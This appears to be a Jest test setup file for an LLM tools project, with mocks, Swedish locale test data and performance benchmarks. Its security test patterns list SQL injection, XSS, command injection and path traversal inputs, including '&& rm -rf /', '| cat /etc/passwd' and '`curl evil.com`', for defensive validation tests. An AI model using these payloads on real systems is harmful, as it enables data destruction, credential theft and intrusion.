/**
 * Test setup for LLM Tools
 * Configures mocks, global test utilities, and environment
 */

import { TextEncoder, TextDecoder } from 'util';
import crypto from 'crypto';

// Polyfills for Node.js environment
global.TextEncoder = TextEncoder;
global.TextDecoder = TextDecoder as any;

// Mock crypto for consistent testing
Object.defineProperty(global, 'crypto', {
  value: {
    randomUUID: () => crypto.randomUUID(),
    getRandomValues: (arr: any) => crypto.randomBytes(arr.length),
    subtle: crypto.webcrypto?.subtle
  }
});

// Environment variables for testing
process.env.NODE_ENV = 'test';
process.env.LLM_PROVIDER = 'mock';
process.env.ENABLE_SECURITY_VALIDATION = 'true';
process.env.ENABLE_AUDIT_LOGGING = 'true';
process.env.DEFAULT_LOCALE = 'sv';
process.env.MAX_CONCURRENT_TOOLS = '5';
process.env.TOOL_TIMEOUT_MS = '5000';

// Global test utilities
global.createMockProvider = (name: string) => ({
  name,
  invoke: jest.fn(),
  isAvailable: jest.fn().mockResolvedValue(true),
  getMetrics: jest.fn().mockResolvedValue({
    requests_total: 0,
    requests_failed: 0,
    latency_p50: 0,
    latency_p95: 0,
    latency_p99: 0
  }),
  reset: jest.fn()
});

global.createMockTool = (name: string) => ({
  name,
  execute: jest.fn().mockResolvedValue({ status: 'success' }),
  validate: jest.fn().mockResolvedValue(true),
  getSchema: jest.fn(),
  getMetrics: jest.fn()
});

global.createMockLogger = () => ({
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  debug: jest.fn(),
  audit: jest.fn(),
  security: jest.fn(),
  performance: jest.fn()
});

// Mock timers for performance testing
global.mockPerformanceNow = () => {
  let time = 0;
  const originalNow = performance.now;
  
  performance.now = jest.fn(() => time);
  
  return {
    advance: (ms: number) => { time += ms; },
    reset: () => { time = 0; },
    restore: () => { performance.now = originalNow; }
  };
};

// Swedish test data generator
global.generateSwedishTestData = () => ({
  suppliers: [
    'Återvinning AB',
    'Städföretaget i Västerås',
    'Avfallshantering Örebro',
    'Miljötjänst Stockholm',
    'Gröna Vägen KB'
  ],
  cities: ['Stockholm', 'Göteborg', 'Malmö', 'Uppsala', 'Västerås', 'Örebro'],
  months: [
    'januari', 'februari', 'mars', 'april', 'maj', 'juni',
    'juli', 'augusti', 'september', 'oktober', 'november', 'december'
  ],
  formatNumber: (value: number, locale: 'sv' | 'en' = 'sv') => {
    if (locale === 'sv') {
      return value.toLocaleString('sv-SE').replace('.', ',');
    }
    return value.toLocaleString('en-US');
  },
  formatCurrency: (value: number, locale: 'sv' | 'en' = 'sv') => {
    if (locale === 'sv') {
      return `${value.toLocaleString('sv-SE').replace('.', ',')} SEK`;
    }
    return `$${value.toLocaleString('en-US')}`;
  },
  formatPercentage: (value: number, locale: 'sv' | 'en' = 'sv') => {
    const percentage = value * 100;
    if (locale === 'sv') {
      return `${percentage.toLocaleString('sv-SE').replace('.', ',')} %`;
    }
    return `${percentage.toLocaleString('en-US')}%`;
  }
});

// Security test utilities
global.securityTestPatterns = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    "1; DELETE FROM data WHERE 1=1;"
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
  ],
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& rm -rf /",
    "`curl evil.com`"
  ],
  pathTraversal: [
    "../../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f%2e%2e%2f"
  ],
  personnummer: [
    "19900101-1234",
    "900101-1234",
    "19900101+1234",
    "9001011234"
  ]
};

// Performance benchmarks
global.performanceBenchmarks = {
  tool_execution: {
    p50: 1000,  // 1 second
    p95: 5000,  // 5 seconds
    p99: 10000  // 10 seconds
  },
  scenario_execution: {
    median: 60000,   // 60 seconds
    p95: 120000      // 120 seconds
  },
  report_generation: {
    max: 5000  // 5 seconds
  },
  provider_fallback: {
    max_attempts: 3,
    timeout_per_attempt: 10000
  }
};

// Mock database connection
global.createMockDatabase = () => ({
  query: jest.fn().mockResolvedValue({ rows: [], rowCount: 0 }),
  insert: jest.fn().mockResolvedValue({ id: 'mock-id' }),
  update: jest.fn().mockResolvedValue({ affected: 1 }),
  delete: jest.fn().mockResolvedValue({ affected: 1 }),
  transaction: jest.fn().mockImplementation(async (callback) => {
    const tx = {
      query: jest.fn(),
      insert: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      commit: jest.fn(),
      rollback: jest.fn()
    };
    try {
      const result = await callback(tx);
      await tx.commit();
      return result;
    } catch (error) {
      await tx.rollback();
      throw error;
    }
  }),
  close: jest.fn()
});

// Mock cache
global.createMockCache = () => ({
  get: jest.fn(),
  set: jest.fn(),
  delete: jest.fn(),
  clear: jest.fn(),
  has: jest.fn(),
  size: jest.fn().mockReturnValue(0)
});

// Test timeout configuration
jest.setTimeout(10000);

// Global error handler for unhandled promises
process.on('unhandledRejection', (error) => {
  console.error('Unhandled promise rejection in test:', error);
});

// Clean up after all tests
afterAll(() => {
  jest.restoreAllMocks();
  jest.clearAllTimers();
});

// Type declarations for global test utilities
declare global {
  function createMockProvider(name: string): any;
  function createMockTool(name: string): any;
  function createMockLogger(): any;
  function mockPerformanceNow(): {
    advance: (ms: number) => void;
    reset: () => void;
    restore: () => void;
  };
  function generateSwedishTestData(): any;
  const securityTestPatterns: any;
  const performanceBenchmarks: any;
  function createMockDatabase(): any;
  function createMockCache(): any;
}

export {};